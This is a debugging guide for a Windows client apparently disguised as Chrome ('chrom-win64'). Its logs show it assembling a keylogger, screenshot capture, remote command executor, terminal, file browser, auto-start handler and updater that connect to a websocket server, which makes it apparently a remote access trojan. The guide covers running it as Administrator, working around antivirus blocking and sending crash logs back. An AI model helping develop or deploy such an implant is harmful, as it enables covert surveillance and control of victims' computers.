# Debug Testing Guide for Windows Client

## Quick Test - Run Debug Version

Transfer `bin/chrom-win64-debug.exe` to your Windows machine and run:

```powershell
# Run in PowerShell (so you can see output)
.\chrom-win64-debug.exe -daemon=false

# Or explicitly specify server
.\chrom-win64-debug.exe -server wss://yourserver.com/ws -daemon=false
```

## What to Look For

The debug version will print detailed logs showing exactly where it fails:

```
[DEBUG] Main: Starting client initialization
[DEBUG] Main: Go version: go1.25.4, OS: windows, Arch: amd64
[DEBUG] Main: Parsing command line flags
[DEBUG] Main: Flags parsed - server=wss://localhost/ws, autostart=false, daemon=false
[DEBUG] Main: Creating machine ID generator
[DEBUG] Main: Getting machine ID
[DEBUG] Main: Machine ID obtained: abc123...
[DEBUG] Main: Creating client instance
[DEBUG] NewClient: Starting client creation
[DEBUG] NewClient: Creating terminal manager
[DEBUG] NewClient: Creating command executor
[DEBUG] NewClient: Creating file browser
[DEBUG] NewClient: Creating screenshot capture
[DEBUG] NewScreenshotCapture: Creating screenshot capture instance
[DEBUG] NewClient: Creating keylogger
[DEBUG] NewClient: Creating updater
[DEBUG] NewClient: Creating auto-start handler
[DEBUG] NewClient: Assembling client struct
[DEBUG] NewClient: Client created successfully
...
```

## If It Still Crashes

Look for the **LAST** debug message printed. This tells us exactly where the crash occurs:

### Example Crash Scenarios

**Scenario 1: Crash at screenshot creation**
```
[DEBUG] NewClient: Creating screenshot capture
Exception 0xc0000005...
```
→ Problem is in `NewScreenshotCapture()` or screenshot DLL loading

**Scenario 2: Crash at DLL initialization**
```
[DEBUG] initScreenshotDLLs: Starting DLL initialization
[DEBUG] initScreenshotDLLs: Loading user32.dll
Exception 0xc0000005...
```
→ Problem loading user32.dll

**Scenario 3: Crash before any output**
```
Exception 0xc0000005...
```
→ Problem at package init time (global variables)

### Capture Full Output

To save all output to a file:

```powershell
.\chrom-win64-debug.exe -daemon=false 2>&1 | Tee-Object -FilePath debug.log
```

Or redirect to file:
```powershell
.\chrom-win64-debug.exe -daemon=false > debug.log 2>&1
```

## Additional Debug Commands

### Check if DLLs are available
```powershell
# Check if user32.dll exists
Get-Command user32.dll -ErrorAction SilentlyContinue

# List all DLLs in System32
ls C:\Windows\System32\user32.dll
ls C:\Windows\System32\gdi32.dll
```

### Run with Windows Error Reporting
```powershell
# Enable Application Error logging
$ErrorActionPreference = "Continue"
.\chrom-win64-debug.exe -daemon=false
```

### Check Event Viewer
After a crash:
1. Open Event Viewer (eventvwr.msc)
2. Go to Windows Logs → Application
3. Look for Error events from your application
4. Note the "Faulting module name" and exception code

## Panic Recovery

If the program panics (Go runtime error), you'll see:
```
[PANIC] Recovered from panic: <error details>
[PANIC] Waiting 30 seconds before exit to allow log review...
```

The program will wait 30 seconds before exiting so you can read the error.

## Testing Without Screenshot/Keylogger

If you suspect screenshot or keylogger DLLs are the issue:

```powershell
# Use the no-screenshot build
.\chrom-win64-noscreenshot.exe -daemon=false
```

## Common Issues

### Access Denied / Permission Issues
```powershell
# Run as Administrator
Start-Process powershell -Verb RunAs
cd <path-to-exe>
.\chrom-win64-debug.exe -daemon=false
```

### DLL Loading Failures
- Try running on a different Windows version (test both Win10 and Win11)
- Try both 32-bit and 64-bit versions
- Check antivirus isn't blocking

### Network Issues
```powershell
# Test basic network connectivity
Test-NetConnection -ComputerName yourserver.com -Port 443
```

## Send Debug Info

After testing, please provide:
1. **Last debug message** printed before crash
2. **Full debug.log** file if available
3. **Windows version**: Run `winver` or `systeminfo | findstr OS`
4. **Architecture**: 32-bit or 64-bit Windows
5. **Event Viewer** error details if available

## Quick Checklist

- [ ] Tried running as Administrator
- [ ] Checked Windows version (Win10/Win11, 32/64-bit)
- [ ] Captured debug output to file
- [ ] Noted last debug message before crash
- [ ] Checked Event Viewer for crash details
- [ ] Tested both debug and release versions
- [ ] Tested with `-daemon=false` flag
